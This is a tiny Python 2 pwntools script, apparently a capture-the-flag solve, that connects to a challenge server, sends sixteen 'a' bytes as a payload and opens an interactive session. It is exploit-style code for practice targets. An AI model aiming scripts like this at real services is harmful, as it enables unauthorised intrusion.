#!/usr/bin/env python2
from pwn import *


host , port = '172.16.115.109' , 10101
host , port = 'ctf.yuawn.idv.tw' , 10101
#host , port = '192.168.78.251' , 4000
y = remote( host , port )

sleep(1)
p = 'a' * 0x10
y.send(p)

y.interactive()